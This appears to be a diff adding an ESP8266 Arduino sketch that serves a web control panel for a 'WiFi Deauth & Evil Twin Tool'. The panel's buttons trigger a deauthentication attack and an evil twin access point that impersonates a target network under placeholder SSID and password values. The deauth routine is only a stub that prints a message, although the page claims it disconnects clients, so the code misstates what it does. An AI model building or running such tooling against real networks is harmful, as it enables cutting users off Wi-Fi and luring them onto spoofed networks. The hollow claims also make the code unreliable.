@@ -1,0 +1,50 @@
+#include <ESP8266WiFi.h>
+#include <ESP8266WebServer.h>
+#include <ESP8266mDNS.h>
+
+const char *ssid = "ESP_Deauth_AP";
+const char *password = "password";
+
+ESP8266WebServer server(80);
+
+void setup() {
+  Serial.begin(115200);
+  
+  WiFi.softAP(ssid, password);
+  
+  Serial.println("ESP8266 Access Point Started");
+  Serial.print("IP Address: ");
+  Serial.println(WiFi.softAPIP());
+
+  server.on("/", HTTP_GET, [](){
+    String html = "<html><body><h1>WiFi Deauth & Evil Twin Tool</h1><form action=\"/attack\" method=\"POST\"><input type=\"submit\" value=\"Start Deauth Attack\"></form><form action=\"/evilTwin\" method=\"POST\"><input type=\"submit\" value=\"Start Evil Twin Attack\"></form></body></html>";
+    server.send(200, "text/html", html);
+  });
+
+  server.on("/attack", HTTP_POST, [](){
+    String html = "<html><body><h1>Starting Deauth Attack...</h1><p>This will disconnect clients from a WiFi network.</p></body></html>";
+    server.send(200, "text/html", html);
+    startDeauthAttack();
+  });
+
+  server.on("/evilTwin", HTTP_POST, [](){
+    String html = "<html><body><h1>Starting Evil Twin Attack...</h1><p>The ESP8266 is now masquerading as a legitimate WiFi network.</p></body></html>";
+    server.send(200, "text/html", html);
+    startEvilTwin();
+  });
+
+  server.begin();
+}
+
+void loop() {
+  server.handleClient();
+}
+
+void startDeauthAttack() {
+  Serial.println("Deauth Attack initiated");
+}
+
+void startEvilTwin() {
+  Serial.println("Evil Twin attack initiated");
+  WiFi.softAP("TARGET_SSID", "TARGET_PASSWORD");
+}
